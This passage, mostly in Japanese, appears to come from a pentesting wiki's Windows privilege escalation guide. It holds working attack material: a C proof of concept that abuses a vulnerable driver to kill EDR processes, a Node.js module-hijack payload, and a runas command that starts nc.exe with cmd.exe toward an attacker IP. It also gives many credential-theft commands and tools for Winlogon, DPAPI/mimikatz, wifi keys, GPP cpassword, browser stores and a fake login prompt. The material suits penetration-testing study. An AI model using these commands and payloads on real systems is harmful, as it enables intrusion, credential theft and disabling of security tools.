
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内の任意の plugin DLL を自動で読み込みます。書き込み可能な portable/copy install がある場合、悪意のある plugin を配置すると、起動のたびに `notepad++.exe` 内で自動的に code execution が得られます（`DllMain` や plugin callbacks からも含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**権限昇格に使える興味深い autoruns locations については、以下のページを読んでください:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step-by-step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限されることを意図した device object を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作のために caller context を検証する。process termination や handle の返却を許可する前に PP/PPL チェックを追加する。
- IOCTL を制限する（access masks、METHOD_*、input validation）し、直接的な kernel privileges の代わりに brokered models を検討する。

防御側向けの検知アイデア
- 疑わしい device 名（例: \\ .\\amsdk*）への user-mode open や、悪用を示唆する特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、自前の allow/deny lists も維持する。


## PATH DLL Hijacking

PATH 上に存在する folder 内で **write permissions** があれば、process によって loaded される DLL を hijack して **escalate privileges** できる可能性がある。

PATH 内のすべての folder の permissions を確認する：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
For more information about how to abuse this check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の変種で、**Node.js** と **Electron** アプリケーションが `require("foo")` のような bare import を実行し、期待される module が **存在しない** 場合に影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリの `node_modules` フォルダを確認して package を解決します。Windows ではこの探索がドライブのルートまで到達するため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を探索する可能性があります。

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー** が `C:\node_modules` を作成できる場合、悪意ある `foo.js`（または package folder）を配置し、**より高い権限で動作する Node/Electron process** が不足している dependency を解決するのを待てます。payload は被害者 process の security context で実行されるため、対象が管理者権限で実行されている場合、昇格された scheduled task/service wrapper から起動されている場合、または自動起動する権限付き desktop app の場合は、これが **LPE** になります。

これは特に次のような場合によく見られます。

- dependency が `optionalDependencies` に宣言されている
- サードパーティー library が `require("foo")` を `try/catch` でラップし、失敗しても処理を継続する
- package が production build から削除された、packaging 時に含まれなかった、または install に失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所にある

### 脆弱な target を探す

解決パスを証明するには **Procmon** を使います。

- `Process Name` を target executable（`node.exe`、Electron app の EXE、または wrapper process）に絞る
- `Path` に `node_modules` を含むように絞る
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功した open に注目する

展開済みの `.asar` ファイルや application source で役立つ code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **不足しているパッケージ名** を特定する。
2. まだ存在しない場合は、root のルックアップディレクトリを作成する:
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前の module をドロップする:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害アプリケーションをトリガーする。アプリケーションが `require("foo")` を実行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性がある。

このパターンに当てはまる、実際によくある不足している optional modules の例としては `bluebird` や `utf-8-validate` があるが、**technique** として再利用できる部分が重要である。つまり、権限のある Windows Node/Electron プロセスが解決する任意の**missing bare import** を見つければよい。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだときにアラートを出す。
- 高整合性プロセスが `C:\node_modules\*` を読み取るのを監視する。
- 本番環境では実行時依存関係をすべてパッケージ化し、`optionalDependencies` の使用を監査する。
- サードパーティコードに、黙って `try { require("...") } catch {}` するパターンがないか確認する。
- ライブラリが対応している場合は optional probes を無効化する（たとえば、一部の `ws` デプロイメントでは `WS_NO_UTF_8_VALIDATE=1` により旧来の `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルール作成、無効化、無効化...）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけられます

root ユーザーを取得できれば、任意のポートで待ち受けできます（最初に `nc.exe` を使ってポートで待ち受けするとき、GUI で `nc` をファイアウォールで許可するかどうかを पूछねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダで確認できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーに**自動的にログイン**できるサーバー、Webサイト、その他のプログラム向けのユーザー認証情報を保存します。初見では、ユーザーが Facebook の認証情報、Twitter の認証情報、Gmail の認証情報などを保存できて、それらにブラウザ経由で自動ログインできるように見えるかもしれません。ですが、そうではありません。

Windows Vault は、Windows がユーザーに自動的にログインできる認証情報を保存します。つまり、リソース（サーバーまたは Webサイト）にアクセスするために認証情報を必要とする**任意の Windows アプリケーション**は、この Credential Manager と Windows Vault を利用でき、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使えます。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソースの認証情報を使うことはできないと思います。したがって、アプリケーションが vault を利用したい場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報を**既定の storage vault から要求する必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を列挙します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプション付きで使用できます。次の例では、SMB共有経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された一組の資格情報を使って `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化するための手法を提供し、主に Windows operating system 内で、非対称 private keys の対称暗号化に使われます。この暗号化は、entropy に大きく寄与する user または system secret を利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. system encryption を伴うシナリオでは、system の domain authentication secrets を利用します。

DPAPI を用いて暗号化された user RSA keys は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**DPAPI key は、同じファイル内でユーザーの private keys を保護する master key と同じ場所に置かれ、通常 64 bytes の random data で構成されます。**（このディレクトリへのアクセスは制限されており、`dir` コマンド in CMD では内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password** で保護された **credentials files** は通常、以下にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`mimikatz module` `dpapi::cred` を、適切な `/masterkey` とともに使って復号できます。\
`sekurlsa::dpapi` module を使うと、(root なら) memory から多くの DPAPI **masterkeys** を **extract** できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、**scripting** や automation tasks で、暗号化された credentials を手軽に保存する方法としてよく使われます。これらの credentials は **DPAPI** によって保護されており、通常は作成された同じ computer 上の同じ user だけが復号できます。

ファイルに含まれている PS credentials を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

それらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` モジュールを適切な `/masterkey` とともに使用して、**任意の .rdg ファイルを復号** してください\
Mimikatz の `sekurlsa::dpapi` モジュールを使えば、メモリから多数の DPAPI masterkey を**抽出**できます

### Sticky Notes

Windows ワークステーションでは、StickyNotes アプリに **password** やその他の情報を保存していることがよくありますが、これは database file であることを見落としがちです。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に探して確認する価値があります。

### AppCmd.exe

**AppCmd.exe から password を取得するには、Administrator で High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が設定されており、**recovered** できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します .\
インストーラーは **SYSTEM 権限で実行** され、多くは **DLL Sideloading（情報元：** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### registry 内の SSH keys

SSH private keys は registry key `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがあるため、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかれば、それは保存された SSH キーである可能性が高いです。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されておらず、起動時に自動的に開始したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、それらを `ssh-add` で追加して machine に ssh 経由で login してみました。registry HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも asymmetric key authentication 中の `dpapi.dll` の使用は特定できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** でもこれらのファイルを検索できます: _post/windows/gather/enum_unattend_

例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを検索する

### Cached GPP Pasword

以前、Group Policy Preferences (GPP) を使って、複数のマシン上にカスタムのローカル管理者アカウントを展開する機能が利用できました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、どのドメインユーザーでもアクセスできました。次に、これらの GPP 内のパスワードは、公開されている既知のデフォルトキーを使って AES256 で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。これは、ユーザーが権限昇格できる可能性があるため、深刻なリスクでした。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、空でない "cpassword" フィールドを含むものを探す関数が開発されました。そのようなファイルが見つかると、この関数はパスワードを復号し、カスタム PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ で検索する:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報を尋ねる

ユーザーに自分の**credentials**、あるいは知っていそうなら**別のユーザーの credentials** を入力してもらうよう、常に**尋ねる**ことができます（ただし、クライアントに直接**credentials**を**尋ねる**のは本当に**危険**であることに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**clear-text** または **Base64** で **passwords** を含んでいたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Search all proposed files:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内のCredentials

Binも確認して、その中にcredentialsがないか探すべきです

いくつかのprogramで保存された**passwords**を**recover**するには、[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html) を使えます

### registry内

**credentialsを含む可能性がある他のregistry key**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry から openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome または Firefox** に保存されている password の db を確認してください。\
また、browser の history、bookmarks、favourites も確認して、そこに **passwords are** 保存されていないか見てください。

browser から password を抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **識別** され、各 component は 1 つ以上の interface を公開し、それらは interface IDs (IIDs) によって識別されます。

